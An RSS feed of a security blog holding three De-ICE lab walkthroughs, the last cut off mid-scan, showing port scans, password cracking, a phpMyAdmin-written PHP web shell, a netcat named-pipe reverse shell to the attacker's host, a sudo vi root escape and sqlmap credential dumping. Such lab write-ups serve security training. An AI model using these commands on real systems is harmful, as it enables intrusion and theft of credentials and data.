@@ -1,0 +1,692 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>De-ice on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/de-ice/</link>
+    <description>Recent content in De-ice on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 23 Apr 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/de-ice/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>De-ICE S1.140</title>
+      <link>http://rastamouse.me/writeups/2014/de-ice-s1-140/</link>
+      <pubDate>Wed, 23 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/de-ice-s1-140/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthrough of how I completed the De-ICE S1.140 challenge.  The final goal for this challenge is undocumented.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:b20d03e1a01ea82238c76576114ed09e&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.140# nmap -n -sV -A -p- 192.168.127.128
+
+PORT    STATE  SERVICE  VERSION
+21/tcp  open   ftp      ProFTPD 1.3.4a
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: ERROR
+22/tcp  open   ssh      OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 08:c6:66:05:29:a6:bd:a0:0b:1b:93:0a:0f:03:42:b0 (DSA)
+|   2048 90:c1:ed:5e:f1:cb:6f:af:23:5b:c5:9f:98:03:27:71 (RSA)
+|_  256 05:c2:e3:f5:7a:37:c4:95:62:2e:43:8b:df:26:33:1a (ECDSA)
+80/tcp  open   http     Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)
+|_http-title: Lazy Admin Corp.
+443/tcp open   ssl/http Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)
+|_http-title: Lazy Admin Corp.
+| ssl-cert: Subject: commonName=webhost
+| Not valid before: 2014-04-21T20:14:28+00:00
+|_Not valid after:  2024-04-18T20:14:28+00:00
+|_ssl-date: 2014-04-21T21:19:59+00:00; -3s from local time.
+465/tcp closed smtps
+993/tcp open   ssl/imap Dovecot imapd
+|_imap-capabilities: more ID IMAP4rev1 post-login AUTH=PLAIN Pre-login capabilities listed SASL-IR OK ENABLE have AUTH=LOGINA0001 LOGIN-REFERRALS LITERAL+ IDLE
+| ssl-cert: Subject: commonName=webhost
+| Not valid before: 2014-04-21T20:14:28+00:00
+|_Not valid after:  2024-04-18T20:14:28+00:00
+|_ssl-date: 2014-04-21T21:19:59+00:00; -3s from local time.
+995/tcp open   ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: RESP-CODES PIPELINING CAPA SASL(PLAIN LOGIN) USER UIDL TOP
+| ssl-cert: Subject: commonName=webhost
+| Not valid before: 2014-04-21T20:14:28+00:00
+|_Not valid after:  2024-04-18T20:14:28+00:00
+|_ssl-date: 2014-04-21T21:19:59+00:00; -3s from local time.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visiting both the HTTP and HTTPS pages greets us with the same page.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/de-ice-1-140/lazy.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&#34;wfuzz:b20d03e1a01ea82238c76576114ed09e&#34;&gt;Wfuzz&lt;/h2&gt;
+
+&lt;p&gt;I ran &lt;code&gt;Wfuzz&lt;/code&gt; against both the HTTP and HTTPS services and got different results for each.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.140# wfuzz -c -zfile,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.127.128/FUZZ/
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.127.128/FUZZ/
+Payload type: file,/usr/share/wfuzz/wordlist/general/common.txt
+Total requests: 950
+
+==================================================================
+ID     Response   Lines      Word         Chars          Request   
+==================================================================
+00191:  C=403      8 L           22 W         210 Ch       &amp;quot; - cgi-bin&amp;quot;
+00290:  C=403      8 L           22 W         206 Ch       &amp;quot; - doc&amp;quot;
+00431:  C=403      8 L           22 W         208 Ch       &amp;quot; - icons&amp;quot;
+00849:  C=200     97 L          525 W        7348 Ch       &amp;quot; - forum&amp;quot;
+
+
+root@kali:~/de-ice/1.140# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 https://192.168.127.128/FUZZ/
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: https://192.168.127.128/FUZZ/
+Payload type: file,/usr/share/wfuzz/wordlist/general/common.txt
+Total requests: 950
+
+==================================================================
+ID     Response   Lines      Word         Chars          Request   
+==================================================================
+00184:  C=403      8 L           22 W         210 Ch       &amp;quot; - cgi-bin&amp;quot;
+00295:  C=403      8 L           22 W         206 Ch       &amp;quot; - doc&amp;quot;
+00375:  C=200     97 L          525 W        7348 Ch       &amp;quot; - forum&amp;quot;
+00424:  C=403      8 L           22 W         208 Ch       &amp;quot; - icons&amp;quot;
+00624:  C=200    126 L          465 W        7540 Ch       &amp;quot; - phpmyadmin&amp;quot;
+00913:  C=302      0 L            0 W           0 Ch       &amp;quot; - webmail&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;lazyadmin-corp-forums:b20d03e1a01ea82238c76576114ed09e&#34;&gt;LazyAdmin corp. Forums&lt;/h2&gt;
+
+&lt;p&gt;I decided to have a look at the /forum/ directory found - as far as I could tell they were identical on both HTTP and HTTPS.  There were several threads available to look through.  The &amp;lsquo;Login Attacks&amp;rsquo; thread contains a snippet from the SSH auth log, and contained a lot of usernames.  I copied this information to a file, then used some command line magic to extract a list of users.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/de-ice/1.140# grep &amp;quot;invalid user&amp;quot; auth.log | cut -d&amp;quot; &amp;quot; -f9,11 | grep -v &amp;quot;invalid&amp;quot; | sort -u&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;A very interesting line popped up, which distinctly resembled a password - the obvious implication is that somebody typed their password as their username by mistake.  To find the possible corresponding user, I went back through the log to read the full line.  The attempt came from 10.0.0.23, so I searched for other login attempts from the same IP - only one user came up:  &lt;code&gt;mbrown&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I attempted to login through SSH with these credentials, but they failed.  It seems SSH to this server requires the publickey.&lt;/p&gt;
+
+&lt;p&gt;I was however able to log into the forum as mbrown.  I had a look through the user profile area and found mbrown&amp;rsquo;s email address:  &lt;code&gt;mb@lazyadmin.corp&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;squirrelmail:b20d03e1a01ea82238c76576114ed09e&#34;&gt;SquirrelMail&lt;/h2&gt;
+
+&lt;p&gt;With this information, I went straight back to the &lt;code&gt;/webmail/&lt;/code&gt; directory I found earlier and was able to log in as mbrown with the same credentials.&lt;/p&gt;
+
+&lt;p&gt;There were a handful of emails in the INBOX and Sent folders, which revealed the root passwords for MySQL and phpmyadmin.  Knowing I had the URL for phpmyadmin also, I headed straight there!&lt;/p&gt;
+
+&lt;h2 id=&#34;phpmyadmin:b20d03e1a01ea82238c76576114ed09e&#34;&gt;phpMyAdmin&lt;/h2&gt;
+
+&lt;p&gt;I had a look through the databases present, particularly for the forum and mail services.  I was able to retrieve a handful of users and password hashes for each service.  I used &lt;code&gt;hash-identifier&lt;/code&gt; to identify the type of hashes these were.  The mail hashes were reported to be MD5, but the forum hashes were not identified - presumably they are custom generated by the &amp;lsquo;my little forum&amp;rsquo; application.  I decided not press ahead with cracking the MD5 hashes before spending the time to investigate the other hashes.&lt;/p&gt;
+
+&lt;p&gt;I cracked two of the MD5 hashes with john.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.140# john --rules --format=raw-md5 --wordlist=/usr/share/wordlists/darkc0de.lst mail 
+Austin-Willard   (sw @ lazyadmin.corp)
+tum-ti-tum       (rh @ lazyadmin.corp)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I logged into the webmail of these two users, but found nothing further of interest.&lt;/p&gt;
+
+&lt;h2 id=&#34;php-code-execution:b20d03e1a01ea82238c76576114ed09e&#34;&gt;PHP Code Execution&lt;/h2&gt;
+
+&lt;p&gt;There was an opportunity to leverage the current access I had in &lt;code&gt;phpmyadmin&lt;/code&gt;, to gain me a remote shell on the system.  Since I was unable to get in through SSH, this seemed like a viable option.&lt;/p&gt;
+
+&lt;p&gt;Using the SQL query window, I ran the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;SELECT &amp;quot; &amp;lt; ? system($_REQUEST[&#39;cmd&#39;]); ? &amp;gt; &amp;quot; INTO OUTFILE &amp;quot;/var/www/cmd.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This failed as the service didn&amp;rsquo;t didn&amp;rsquo;t have the privilege required to write directly into &lt;code&gt;/var/www/&lt;/code&gt;.  Instead, I looked for writable directories within the &amp;lsquo;my little forum&amp;rsquo; directory.  According to the installation requirements of this application, the &lt;code&gt;templates_c&lt;/code&gt; directory should be writable.  A quick test in the brower showed that I could indeed access this directory.  I altered the SQL query as required, which successfully ran.  I then visited my new file, and command execution was successful.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/de-ice-1-140/phpmyadmin.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/de-ice-1-140/cmd.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I thought I would try to use this code execution to obtain a &lt;code&gt;netcat&lt;/code&gt; shell, though it seemed the version running on the remote host was not compiled to support the -e option.  Instead, I used the named pipe technique to obtain an interactive shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://192.168.127.128/forum/templates_c/cmd.php?cmd=mknod /var/www/forum/templates_c/backpipe p
+https://192.168.127.128/forum/templates_c/cmd.php?cmd=/bin/bash 0 &amp;lt; /var/www/forum/templates_c/backpipe | nc 192.168.127.127 4444 1 &amp;gt; /var/www/forum/templates_c/backpipe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.140# nc -lnvp 4444
+python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this point I did some standard enumeration - users&amp;rsquo; and their groups etc.  It seems that swillard is the only user in the sudoers group, so would most likely be my final target.  I also came across &lt;code&gt;/opt/backup.sh&lt;/code&gt;, which had an interesting ACL set.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mbrown:x:1001:1001:Mark Brown
+rhedley:x:1002:1002:Richard Hedley
+swillard:x:1003:1003:Sandy Willard
+mparker:x:1004:1004:Miles Parker
+ftpuser:x:997:rhedley,mbrown,ftp
+ftpadmin:x:999:rhedley,swillard
+sshlogin:x:998:swillard,mbrown
+sudo:x:27:swillard
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;www-data@webhost:/$ getfacl /opt/backup.sh
+getfacl /opt/backup.sh
+getfacl: Removing leading &#39;/&#39; from absolute path names
+# file: opt/backup.sh
+# owner: root
+# group: root
+user::rwx
+group::rw-
+group:ftpadmin:r--
+mask::rw-
+other::---
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I already had some cracked email passwords for swillard and rhedley (two users in the ftpadmin group), so tried them with su.&lt;/p&gt;
+
+&lt;p&gt;The password for &lt;code&gt;rhedley&lt;/code&gt; worked and I was able to read the &lt;code&gt;backup.sh&lt;/code&gt; file.  This contained an &lt;code&gt;openssl&lt;/code&gt; command to create the encrypted backup file I retrieved via FTP earlier.  I used this information to decrypt and extract the archive.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;openssl aes-256-cbc -in ${TMPBACKUP}/${FILENAME}.gz -out ${TMPBACKUP}/${FILENAME}.gz.enc -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
+root@kali:~/de-ice/1.140# openssl aes-256-cbc -d -in backup_webhost_130111.tar.gz.enc -out backup_webhost_130111.tar.gz -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;more-john:b20d03e1a01ea82238c76576114ed09e&#34;&gt;More John&lt;/h2&gt;
+
+&lt;p&gt;Within the archive was a backed up &lt;code&gt;/etc/&lt;/code&gt; directory, with a &lt;code&gt;shadow&lt;/code&gt; file containing hashes for &lt;code&gt;rhedley&lt;/code&gt;, &lt;code&gt;mbrown&lt;/code&gt; and &lt;code&gt;sraines&lt;/code&gt;. Raines is now Willard, so assuming her password wasn&amp;rsquo;t changed when her name was, cracking her password will give us access to a sudo-enabled account.&lt;/p&gt;
+
+&lt;p&gt;It took a long time for john to crack this one, as the SHA512 is slow to calculate.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.140# john --rules --wordlist=/usr/share/wordlists/darkc0de.lst etc/shadow
+brillantissimo   (sraines)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;back-to-the-shell:b20d03e1a01ea82238c76576114ed09e&#34;&gt;Back to the Shell&lt;/h2&gt;
+
+&lt;p&gt;From the &lt;code&gt;rhedley&lt;/code&gt; account, which I was still logged in as, I tried to su to the swillard account with the newly cracked password.&lt;/p&gt;
+
+&lt;p&gt;Within the root folder was a file called &lt;code&gt;secret.jpg&lt;/code&gt;, which I downloaded to my machine via &lt;code&gt;netcat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;There didn&amp;rsquo;t appear to be any hidden messages either within the image or hex, so I assume this was the final flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/de-ice-1-140/secret.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>De-ICE S2.100</title>
+      <link>http://rastamouse.me/writeups/2013/de-ice-s2-100/</link>
+      <pubDate>Sat, 19 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/de-ice-s2-100/</guid>
+      <description>
+
+&lt;p&gt;This is how I solved the De-ICE S2.100 challenge.  The goal is to obtain salary information for the team of employees.&lt;/p&gt;
+
+&lt;h2 id=&#34;netdiscover:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;Netdiscover&lt;/h2&gt;
+
+&lt;p&gt;As usual I ran netdiscover on the subnet range, and straight away something jumped out.&lt;/p&gt;
+
+&lt;p&gt;This VM was hosting two Apache services on different IPs.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# netdiscover -r 192.168.2.0/24 -i eth2
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
+_____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                  
+-----------------------------------------------------------------------------
+192.168.2.100   08:00:27:f6:e8:1d    01    060   CADMUS COMPUTER SYSTEMS
+192.168.2.101   08:00:27:f6:e8:1d    01    060   CADMUS COMPUTER SYSTEMS
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;nmap:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;p&gt;I then scanned the two IPs with nmap.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# nmap -n -sV -A -p- 192.168.2.100; nmap -n -sV -A -p- 192.168.2.101
+
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd 2.0.4
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: Can&#39;t parse PASV response: &amp;quot;EOF&amp;quot;
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+| smtp-commands: slax.example.net Hello [192.168.2.200], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP,
+|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &amp;quot;HELP &amp;lt;topic&amp;gt;&amp;quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html).
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+|_imap-capabilities: CAPABILITY SCAN LOGIN-REFERRALS MAILBOX-REFERRALS MULTIAPPEND SORT UNSELECT NAMESPACE STARTTLS LITERAL+ IDLE THREAD=REFERENCES THREAD=ORDEREDSUBJECT OK IMAP4REV1 SASL-IR AUTH=LOGINA0001 completed BINARY
+443/tcp closed https
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Site doesn&#39;t have a title (text/html).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The Apache service on .100 contained a page containing a long list of users, and as before I took these to form a potential list of users.  This list was quite a lot longer than in previous challenges, so the time it would take to bruteforce SSH logins would be longer than I was willing to spend.&lt;/p&gt;
+
+&lt;h2 id=&#34;smtp:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;SMTP&lt;/h2&gt;
+
+&lt;p&gt;I decided to try and validate usernames via the SMTP service.  After experimenting with different the methods, I had a valid list of users.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# smtp-user-enum -M RCPT -f root @ slax.example.net -U users -t 192.168.2.100
+192.168.2.100: havisham exists
+192.168.2.100: magwitch exists
+192.168.2.100: pirrip exists
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;nikto:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;Nikto&lt;/h2&gt;
+
+&lt;p&gt;I continued to enumerate the other services, but nothing popped until I ran &lt;code&gt;nikto&lt;/code&gt; against the Apache service on .101 (I can imagine that send quite a few people crazy).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# nikto -h 192.168.2.101 -Display 124
++ OSVDB-637: /~root/: Allowed to browse root&#39;s home directory.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seemed that the root user&amp;rsquo;s home directory was accessible through Apache, although it appeared empty.&lt;/p&gt;
+
+&lt;h2 id=&#34;wfuzz:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;Wfuzz&lt;/h2&gt;
+
+&lt;p&gt;Wfuzz is a web crawler and fuzzing tool.  With my list of valid users, I was able to locate their home directories also, but they also appeared empty.  I used &lt;code&gt;wfuzz&lt;/code&gt; to try and find hidden directories that are likely to appear in users&amp;rsquo; home directories (&lt;code&gt;.bashrc&lt;/code&gt;, &lt;code&gt;.bash_history&lt;/code&gt; etc).&lt;/p&gt;
+
+&lt;p&gt;I got a hit for a .ssh directory in pirrip&amp;rsquo;s directory - within which were &lt;code&gt;id_rsa&lt;/code&gt; files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# wfuzz -c -z file,users --hc 404 http://192.168.2.101/~FUZZ/
+00001:  C=200     11 L           46 W         570 Ch       &amp;quot; - havisham&amp;quot;
+00002:  C=200     11 L           46 W         570 Ch       &amp;quot; - magwitch&amp;quot;
+00003:  C=200     11 L           46 W         566 Ch       &amp;quot; - pirrip&amp;quot;
+
+root@kali:~/de-ice/2.100# wfuzz -c -zfile,users --hc 404 http://192.168.2.101/~FUZZ/.ssh
+00003:  C=301      9 L           29 W         329 Ch       &amp;quot; - pirrip&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ssh:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;I downloaded the id_rsa key and was able to SSH in, as pirrip.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# chmod 400 id_rsa
+root@kali:~/de-ice/2.100# ssh -i id_rsa pirrip @ 192.168.2.100
+Linux 2.6.16.
+pirrip@slax:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Reviewing the passwd and group files showed that pirrip was part of the wheel group, but I was unable to use sudo as I didn&amp;rsquo;t know pirrip&amp;rsquo;s password.
+I began looking through the filesystem and eventually came across &lt;code&gt;/var/spool/mail/pirrip&lt;/code&gt;.  Within here was an email password reminder for pirrip, I tried this password with sudo and it worked.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;pirrip@slax:~$ more /var/spool/mail/pirrip 
+E-Mail: pirrip @ slax.example.net
+Password: 0l1v3rTw1st
+
+pirrip@slax:~$ sudo -l
+User pirrip may run the following commands on this host:
+    (root) /usr/bin/more
+    (root) /usr/bin/tail
+    (root) /usr/bin/vi
+    (root) /usr/bin/cat ALL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;sudo:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;Sudo&lt;/h2&gt;
+
+&lt;p&gt;I could now obtain a list of sudo rights for pirrip.  I could&amp;rsquo;ve used this to obtain the shadow file, to try and crack the root password.  However, an easier route to get a root shell, is through the vi text editor.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;pirrip@slax:~$ sudo vi
+:!/bin/bash
+bash-3.1# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:ba134c7f85bed935eb6493dd99cdb880&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;p&gt;I then found &lt;code&gt;great_expectations.zip&lt;/code&gt; within &lt;code&gt;/root/.save/&lt;/code&gt;.  Trying to extract this directly on the server resulted in error messages about limited disk space.  So I transfered the file to my Kali machine using netcat.&lt;/p&gt;
+
+&lt;p&gt;No passwords were required to decompress, granting me access to &lt;code&gt;Jan08&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/2.100# unzip great_expectations.zip 
+root@kali:~/de-ice/2.100# tar -xvf great_expectations.tar 
+root@kali:~/de-ice/2.100# cat Jan08 
+ 
+Philip Pirrip:  734-67-0424 5.5% $74,224
+Abel Magwitch:  816-03-0028 4.0% $53,122
+Estella Havisham: 762-93-1073 12% $84,325
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>De-ICE S1.120</title>
+      <link>http://rastamouse.me/writeups/2013/de-ice-s1-120/</link>
+      <pubDate>Fri, 18 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/de-ice-s1-120/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthrough of how I completed the De-ICE S1.230 challenge.  The goal is to access various internal documents.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:1a817b9b9b67bfd1b15cedf6dcbe70ff&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.120# nmap -n -sV -A -p- 192.168.1.120
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD 1.3.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_dr-xr-xr-x   2 0        0              40 Jan  2  2011 incoming
+22/tcp   open  ssh      OpenSSH 5.1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 f0:90:25:9a:9e:cd:bd:31:ec:e9:f4:11:47:2f:69:a4 (DSA)
+|_  2048 06:32:d9:26:9a:53:f0:78:9c:43:fd:9c:50:26:d0:64 (RSA)
+80/tcp   open  http     Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Primaline :: Quality Kitchen Accessories
+443/tcp  open  ssl/http Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Primaline :: Quality Kitchen Accessories
+| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2004-10-01T08:10:30+00:00
+|_Not valid after:  2010-09-30T08:10:30+00:00
+|_ssl-date: 2014-04-23T11:50:09+00:00; -2s from local time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_IDEA_128_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+3306/tcp open  mysql    MySQL (unauthorized)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;sql-injection:1a817b9b9b67bfd1b15cedf6dcbe70ff&#34;&gt;SQL Injection&lt;/h2&gt;
+
+&lt;p&gt;Visiting the apache service in a browser takes you to a Data Entry site.&lt;/p&gt;
+
+&lt;p&gt;{% img {{ root_url }} /images/write-ups/de-ice-1-120/primaline.jpg %}&lt;/p&gt;
+
+&lt;p&gt;Clicking on the View Products link takes you to another page, where you can select products from a drop-down list.  There are no items in there by default, but clicking on the Submit button alters the URL to:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://192.168.1.120/products.php?id=NULL&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I did some manual tests, but they did not produce any visible SQL error messages.  Though I put the URL into SQLMap to run some more extensive tests.  SQLMap reported an SQL Union vulnerability.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.120# sqlmap -u http://192.168.1.120/products.php?id=NULL
+GET parameter &#39;id&#39; is &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39; injectable
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.120# sqlmap -u http://192.168.1.120/products.php?id=NULL --current-user --current-db --is-dba
+web application technology: Apache 2.2.11, PHP 5.2.9
+back-end DBMS: MySQL 5
+current user:    &#39;webapp@localhost&#39;
+current database:    &#39;merch&#39;
+current user is DBA:    True
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I next used SQLMap to extract DBMS usernames and passwords, which gave me a rather long list.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.120# sqlmap -u http://192.168.1.120/products.php?id=NULL --users --passwords
+fetching database users password hashes
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+writing hashes to a temporary file &#39;/tmp/sqlmaphashes-BMaKet.txt&#39;
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
